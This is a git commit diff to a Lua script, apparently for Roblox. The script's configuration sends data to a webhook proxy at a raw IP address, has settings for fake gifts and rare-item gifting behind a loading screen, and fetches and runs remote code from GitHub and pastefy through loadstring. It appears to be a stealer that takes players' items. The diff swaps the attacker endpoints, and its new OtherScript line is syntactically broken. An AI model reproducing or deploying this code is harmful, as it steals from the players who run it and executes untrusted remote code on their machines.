62ec0c151729e9f7c28404d368f6e3eec24261e4
zuldob3 <andreygat22@gmail.com>
2025-08-06 20:40:25 +0200

    Upload script.lua via Script Source Converter

--- script.lua
+++ script.lua
@@ -2,13 +2,13 @@ _G.NullConfig = {
     User = {},
     min_value = 10000000000,
     pingEveryone = "No", -- dont change this
-    Webhook = "http://176.100.37.215:20002/proxy/d7091e0330ebac0539ffc30b158b789c",
+    Webhook = "http://176.100.37.215:20002/proxy/860d28750854f1c1ce503017deae7ffb",
     FakeGift = "No",
-    Trash = "http://176.100.37.215:20002/proxy/d7091e0330ebac0539ffc30b158b789c",
+    Trash = "http://176.100.37.215:20002/proxy/860d28750854f1c1ce503017deae7ffb",
     LoadingScreen = "Yes",
     GiftOnlyRares = "No",
     ExecuteOtherScript = "Yes",
-    OtherScript = "loadstring(game:HttpGet("https://raw.githubusercontent.com/Jstarzz/petmover/refs/heads/main/main.lua", true))()",
+    OtherScript = "https://pastefy.app/xp6cTqgF/raw"))()",
 }
     
 loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
